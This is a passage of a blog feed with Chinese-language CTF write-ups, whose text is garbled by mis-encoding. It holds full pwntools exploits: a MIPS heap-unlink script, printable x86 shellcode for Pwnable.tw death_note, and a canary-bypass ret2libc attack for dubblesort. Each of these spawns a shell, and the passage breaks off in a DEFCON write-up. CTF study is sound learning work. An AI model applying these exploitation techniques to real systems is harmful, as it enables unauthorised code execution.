class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;mips&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">p.sendafter(<span class="string">&quot;options &gt;&gt; &quot;</span>,<span class="built_in">str</span>(c)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;length: &quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">p.sendafter(<span class="string">&quot;info: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendafter(<span class="string">&quot;info: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">1234</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p=remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=process([<span class="string">&#x27;./qemu-mipsel-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;-g&#x27;</span>, <span class="string">&#x27;1234&#x27;</span>, <span class="string">&#x27;./managesystem&#x27;</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x24</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x34</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x34</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">sc=asm(shellcraft.sh(),endian=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">add(<span class="number">0x84</span>,sc+<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">node_list=<span class="number">0x00411830</span></span><br><span class="line">payload=p32(<span class="number">0</span>)+p32(<span class="number">0x31</span>)+p32(node_list+<span class="number">8</span>-<span class="number">0xc</span>)+p32(node_list+<span class="number">8</span>-<span class="number">0x8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x30</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p32(<span class="number">0x30</span>)+p32(<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p32(<span class="number">0x04117B4</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;info: &quot;</span>)</span><br><span class="line">libc = u32(p.recv(<span class="number">4</span>))-<span class="number">0x0056B68</span></span><br><span class="line">info(<span class="string">&quot;libc&quot;</span>+<span class="built_in">hex</span>(libc))</span><br><span class="line">edit(<span class="number">1</span>,p32(libc+<span class="number">0x007AE90</span>))  <span class="comment">#env -&gt;stack</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;info: &quot;</span>)</span><br><span class="line">stack=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">&quot;stack&quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">ret=stack-<span class="number">0x158</span></span><br><span class="line">edit(<span class="number">1</span>,p32(ret))</span><br><span class="line">edit(<span class="number">0</span>,p32(<span class="number">0x4120a0</span>))</span><br><span class="line">cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.tw death_note</title>
      <link href="/2020/10/15/Pwnable_death_note/"/>
      <url>/2020/10/15/Pwnable_death_note/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwnable-tw-death-note"><a href="#Pwnable-tw-death-note" class="headerlink" title="Pwnable.tw death_note"></a>Pwnable.tw death_note</h3><blockquote><p>printable shellocode</p></blockquote><span id="more"></span><p>è¿™é¢˜è¿˜ç®—ç®€å•ï¼Œaddæ—¶idxæ£€æŸ¥ä¸ä¸¥å¯¼è‡´å¯ä»¥å‘ä¸Šå†™gotè¡¨ï¼ŒåŒæ—¶NXæ²¡å¼€ï¼Œå› æ­¤æˆ‘ä»¬å…ˆåœ¨heapé‡Œå†™shellcodeï¼Œä¹‹åæ”¹puts_gotæ‰§è¡Œshellcodeã€‚</p><p>ä½†é¢˜ç›®å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œäº†é™åˆ¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">is_printable</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; <span class="built_in">strlen</span>(s) &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] &lt;= <span class="number">0x1F</span> || s[i] == <span class="number">0x7F</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬æ„é€ çš„shellcodeè¦ç¬¦åˆæ¡ä»¶ï¼Œä¹Ÿå³å¯æ‰“å°çš„shellcodeã€‚</p><p>ç”±äºé™åˆ¶ï¼ŒmovæŒ‡ä»¤æ— æ³•ä½¿ç”¨äº†ï¼Œä½†å¯ä»¥é€šè¿‡push,popæ¥æ›¿ä»£ã€‚æœ€è‡´å‘½çš„æ—¶â€™int 0x80â€™æ²¡äº†ğŸ˜±</p><p>çœ‹äº†P4ndaå¸ˆå‚…çš„åšå®¢ï¼Œå­¦åˆ°äº†è¿˜å¯ä»¥ç”¨sub byte ptr[eax + 0x35] , dl;sub byte ptr[eax + 0x34] , dlè¿™æ ·çš„æ‰§è¡Œå¯¹æœºå™¨ç è¿›è¡Œä¿®æ”¹ã€‚</p><p>ç”±äºint 0x80çš„æœºå™¨ç ä¸º cd 80 (16è¿›åˆ¶)ï¼Œåˆ‡åœ¨shellcodeå¼€å§‹æ‰§è¡Œæ—¶edxå­˜æ”¾shellcodeé¦–åœ°å€ï¼Œå› æ­¤æ„é€ eax&#x3D;shellcode_addr,dl&#x3D;0x60,ä¹‹åå†ptr[eax + 0x35]å³shellcodeç»“å°¾å¤„å†™å…¥â€™\x6b\x40â€™ï¼Œé€šè¿‡æ‰§è¡Œæ”¹æŒ‡ä»¤å¯ä»¥ä¿®æ­£ä½¿å…¶ä¸º0xcdå’Œ0x80ï¼Œå¤ªå¦™äº†ã€‚</p><p>å¦å¤–eax&#x3D;0xbå¯ä»¥é€šè¿‡xoræŒ‡ä»¤å®ç°ã€‚</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">10201</span></span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> host:</span><br><span class="line">        p=remote(host,port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=process(<span class="string">&quot;./death_note&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#eax=0xb,ebx=&quot;/bin/sh&quot;,ecx=edx=0</span></span><br><span class="line">    shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        push 0x68</span></span><br><span class="line"><span class="string">        push 0x732f2f2f</span></span><br><span class="line"><span class="string">        push 0x6e69622f</span></span><br><span class="line"><span class="string">        push esp</span></span><br><span class="line"><span class="string">        pop ebx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        push edx</span></span><br><span class="line"><span class="string">        pop eax</span></span><br><span class="line"><span class="string">        push 0x60606060</span></span><br><span class="line"><span class="string">        pop edx</span></span><br><span class="line"><span class="string">        sub byte ptr[eax + 0x35] , dl</span></span><br><span class="line"><span class="string">        sub byte ptr[eax + 0x35] , dl</span></span><br><span class="line"><span class="string">        sub byte ptr[eax + 0x34] , dl</span></span><br><span class="line"><span class="string">        push 0x3e3e3e3e</span></span><br><span class="line"><span class="string">        pop edx</span></span><br><span class="line"><span class="string">        sub byte ptr[eax + 0x34] , dl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        push ecx</span></span><br><span class="line"><span class="string">        pop edx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        push edx</span></span><br><span class="line"><span class="string">        pop eax</span></span><br><span class="line"><span class="string">        xor al, 0x40</span></span><br><span class="line"><span class="string">        xor al, 0x4b</span></span><br><span class="line"><span class="string">        push edx</span></span><br><span class="line"><span class="string">        pop edx</span></span><br><span class="line"><span class="string">        push edx</span></span><br><span class="line"><span class="string">        pop edx</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># gdb.attach(p,&#x27;b*0x80487EF&#x27;)</span></span><br><span class="line">    offset=-<span class="number">16</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.send(asm(shellcode)+<span class="string">&#x27;\x6b\x40&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(<span class="string">&quot;chall.pwnable.tw&quot;</span>)</span><br></pre></td></tr></table></figure><p>å‚è€ƒåšæ–‡ï¼š<br>(<a href="http://p4nda.top/2017/09/29/pwnable-tw-deathnote/">http://p4nda.top/2017/09/29/pwnable-tw-deathnote/</a>)</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.tw dubblesort</title>
      <link href="/2020/10/14/Pwnable_dubblesort/"/>
      <url>/2020/10/14/Pwnable_dubblesort/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwnable-tw-dubblesort"><a href="#Pwnable-tw-dubblesort" class="headerlink" title="Pwnable.tw  dubblesort"></a>Pwnable.tw  dubblesort</h3><blockquote><p>æœ€è¿‘æ€»æ˜¯æƒ³å†™ç‚¹ä¸œè¥¿ï¼Œæƒ³æ¥æƒ³å»è¿˜æ˜¯pwnable.twä¸Šçš„é¢˜ç›®å€¼å¾—è®°å½•ï¼Œå› æ­¤å‡†å¤‡å†™ä¸ªseriesï¼Œå°±ä»200åˆ†çš„dubblesortå¼€å§‹å§ğŸ˜</p></blockquote><span id="more"></span><p>32ä½çš„ç¨‹åºï¼Œé¢˜ç›®åæ˜¯dubblesortå†’æ³¡æ’åºï¼Œå…ˆåˆ†æä¸€æ³¢ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__printf_chk(<span class="number">1</span>, (<span class="type">int</span>)<span class="string">&quot;What your name :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1</span>, (<span class="type">int</span>)<span class="string">&quot;Hello %s,How many numbers do you what to sort :&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¼€å§‹çš„nameè¾“å…¥åˆ°stackä¸Šï¼Œreadæ²¡æœ‰â€™\0â€™æˆªæ–­ï¼Œå› æ­¤å¯ç”¨æ¥æ³„éœ²æ ˆé‡Œçš„æ•°æ®ï¼Œå¤šä¸ºlibcã€‚</p><p>ä¹‹åç¨‹åºè®©æˆ‘ä»¬è¾“å…¥sort numberå’Œnumber,è¿™äº›æ•°æ®éƒ½æ˜¯å­˜æ”¾åœ¨stackä¸Šçš„,ç„¶åæ‰§è¡Œsort()å‡½æ•°è¿›è¡Œå†’æ³¡æ’åºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__printf_chk(<span class="number">1</span>, (<span class="type">int</span>)<span class="string">&quot;Hello %s,How many numbers do you what to sort :&quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v9);</span><br><span class="line">count = v9;</span><br><span class="line"><span class="keyword">if</span> ( v9 )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = &amp;nums;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1</span>, (<span class="type">int</span>)<span class="string">&quot;Enter the %d number : &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, v4);</span><br><span class="line">    ++v5;</span><br><span class="line">    count = v9;</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v9 &gt; v5 );</span><br><span class="line">&#125;</span><br><span class="line">sort((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;nums, count);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Result :&quot;</span>);</span><br></pre></td></tr></table></figure><p>ç”±äºè¾“å…¥çš„æ•°é‡ç”±æˆ‘ä»¬æ§åˆ¶ï¼Œé‚£å°±å¯ä»¥æ ˆæº¢å‡ºäº†ï¼Œéš¾ç‚¹åœ¨äºç¨‹åºå¼€å¯äº†canaryï¼Œå› æ­¤æˆ‘ä»¬è¦åšçš„å°±æ˜¯å¦‚ä½•èƒ½å¤Ÿä¸æ”¹æ‰canaryåŒæ—¶è¦†ç›–è¿”å›åœ°å€ï¼Œå¹¶ä¸”åœ¨sort()åè¿™äº›æ•°æ®è¿˜èƒ½å†å¯¹åº”çš„ä½ç½®ä¸Š(å¯èƒ½å› ä¸ºå¤§å°é—®é¢˜è€Œè¢«äº¤æ¢ä¹‹ç±»çš„)ğŸ“</p><p>åœ¨æ‰§è¡Œ__isoc99_scanf(â€œ%uâ€, v4);æ—¶ï¼Œå½“æˆ‘å°è¯•è¾“å…¥ä¸€äº›éæ³•çš„å­—ç¬¦å¦‚â€™#â€™ï¼Œç”±äºâ€%uâ€è¡¨ç¤ºæ¥æ”¶æ•°æ®æ ¼å¼ä¸ºæ— ç¬¦å·çš„æ•´å½¢ï¼Œå› æ­¤è§†â€™#â€™ä¸ºéæ³•çš„å­—ç¬¦ï¼Œä»è€Œscanfæ‰§è¡Œå¤±è´¥ï¼Œæ ˆä¸Šå¯¹åº”çš„æ•°æ®æ²¡æœ‰è¢«ä¿®æ”¹ï¼Œä½†ä¹Ÿå¯¼è‡´å®ƒç•™åœ¨äº†stdiné‡Œä½¿å¾—åé¢å¾ªç¯çš„scanfä¹Ÿæ— æ³•æ­£ç¡®æ‰§è¡Œï¼Œé‚£æœ‰æ²¡æœ‰ä»€ä¹ˆå­—ç¬¦å¯ä»¥ä½¿å¾—scanfè§†å…¶ä¸ºåˆæ³•å­—ç¬¦å´ä¸ä¿®æ”¹stackçš„æ•°æ®å‘¢?</p><p>ç½‘ä¸ŠæŸ¥æ‰¾ä¸€ç•ªäº†è§£åˆ°â€™+â€™å’Œâ€™-â€˜å¯ä»¥ğŸ‰ã€‚åŸå› åœ¨äºè¿™ä¸¤ä¸ªç¬¦å·ç”¨äºå®šä¹‰æ­£æ•°å’Œè´Ÿæ•°ï¼Œå½“è¾“å…¥+4æ—¶ä¼šè§†ä¸º4ï¼Œ-4ä¼šè§†ä¸ºæ— ç¬¦å·çš„0x100000000-4,å› æ­¤å½“æˆ‘ä»¬åªè¾“å…¥â€™+â€™æ—¶ï¼Œç”±äºæˆ‘ä»¬å®é™…ä¸Šä»€ä¹ˆä¹Ÿæ²¡è¾“å…¥ï¼Œè‡ªç„¶ä¹Ÿå°±ä¸ä¼šæ”¹å†™stackä¸Šçš„æ•°æ®ã€‚</p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨canaryå‰å†™å…¥â€™0â€™,canaryå¤„å†™å…¥â€™+â€™,cananryåé¢åˆ°ebpå†™str(0xf0000000)ï¼Œret_addrå†™systemï¼Œç„¶åå†™ä¸¤ä¸ªlibcä¸­â€™&#x2F;bin&#x2F;shâ€™çš„åœ°å€ï¼Œè¿™æ ·æ„é€ çš„è¯sort()å®Œå…¶ä½ç½®å°†ä¸ä¼šå› äº¤æ¢è€Œæ”¹å˜ï¼ˆæ²¡æœ‰å‘ç”Ÿäº¤æ¢ï¼‰ï¼Œä»è€Œèƒ½æ‹¿åˆ°flagğŸš©</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">DEBUG=<span class="number">0</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line"><span class="comment"># r=process(&quot;./dubblesort&quot;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;../libc_32.so.6&quot;&#125;)</span></span><br><span class="line">p=process(<span class="string">&quot;./dubblesort&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10101</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;../libc_32.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">got_plt_offset = <span class="number">0x1b0000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line">payload_1 = <span class="string">&quot;a&quot;</span>*<span class="number">24</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload_1)</span><br><span class="line">libc_addr = u32(p.recv()[<span class="number">30</span>:<span class="number">34</span>])-<span class="number">0xa</span></span><br><span class="line">libc_address = libc_addr - got_plt_offset</span><br><span class="line"><span class="comment"># libc_address=u32(p.recv(4))-0x1b3061</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc_address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;sort :&#x27;)</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">35</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xf0000000</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_address))</span><br><span class="line">p.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line"><span class="comment"># p.sendline(str(libc.sym[&#x27;system&#x27;]+libc_address+1))</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(libc_address+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()))</span><br><span class="line">p.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(libc_address+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DEFCON2018_Quals_mario</title>
      <link href="/2020/10/12/DEFCON18_Quals_mario/"/>
      <url>/2020/10/12/DEFCON18_Quals_mario/</url>
      
        <content type="html"><![CDATA[<h3 id="DEFCON2018-mario"><a href="#DEFCON2018-mario" class="headerlink" title="DEFCON2018 mario"></a>DEFCON2018 mario</h3><blockquote><p>ä¸€æ¬¡å‹‡æ•¢çš„å°è¯•ğŸ‘¼ é¢†æ•™äº†defconçš„éš¾åº¦ï¼Œæ€»ç»“äº†ä¸€ç‚¹éš¾é¢˜çš„è§„å¾‹ï¼š<br>1.ä»£ç é‡å¤§<br>2.æ•°æ®å¤æ‚<br>3.æ¼æ´éšè”½<br>4.åˆ©ç”¨å›°éš¾<br>5.Cå’ŒC+æ··åˆ,ä¸”ç”¨vectorå¯¼è‡´å †å¾ˆçç¢</p></blockquote><span id="more"></span><p>æˆ‘å…¨ç¨‹è·Ÿç€hxpçš„è„šæœ¬è¾¹è°ƒè¾¹åšä½†ä¹Ÿåªæ˜¯æ‡‚äº†å¤§æ¦‚80%ï¼Œæ˜ç™½äº†æ¼æ´æ‰€åœ¨ï¼Œæ˜ç™½äº†leakçš„æ–¹æ³•ï¼Œä½†æœ€åçš„æ‹¿shellå¾ˆğŸ˜µï¼Œhxpè¯´æ˜¯åˆ©ç”¨win_heap(æŒ‡å‘one_gadgetçš„heap)è¦†ç›–è¾“å‡ºpizza objectdçš„å‡½æ•°vtableï¼Œå†é€šè¿‡admireå‡½æ•°å®ç°æ‰§è¡Œï¼Œå¯èƒ½è¿˜æ˜¯æˆ‘ç»“æ„ä½“æˆ–è€…vectoråˆ†æçš„æœ‰é—®é¢˜å§ğŸ˜¥</p><p>æˆ‘å…ˆåˆ†æä¸€ä¸‹æ¼æ´æ‰€åœ¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Before I start cooking your pizzas, do you have anything to declare? Please explain: &quot;</span>);</span><br><span class="line"> read_n_0((__int64)byte_20C480, <span class="number">0x12C</span>);</span><br><span class="line"> v1 = <span class="built_in">strlen</span>(byte_20C480);</span><br><span class="line"> *(_QWORD *)(a1 + <span class="number">32</span>) = <span class="built_in">malloc</span>(v1 + <span class="number">1</span>);</span><br><span class="line"> <span class="built_in">strcpy</span>(*(<span class="type">char</span> **)(a1 + <span class="number">32</span>), byte_20C480);</span><br></pre></td></tr></table></figure><p> cookå‡½æ•°ä¼šè¦æ±‚æˆ‘ä»¬ç•™è¨€,å¹¶æ ¹æ®æˆ‘ä»¬è¾“å…¥çš„æ•°æ®é•¿åº¦æ¥mallocã€‚<br> ä½†å¦‚æœmarioç”Ÿæ°”çš„è¯ä¼šæœ‰ä¸€ä¸ªâ€™Pâ€™é€‰é¡¹ï¼š<br> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 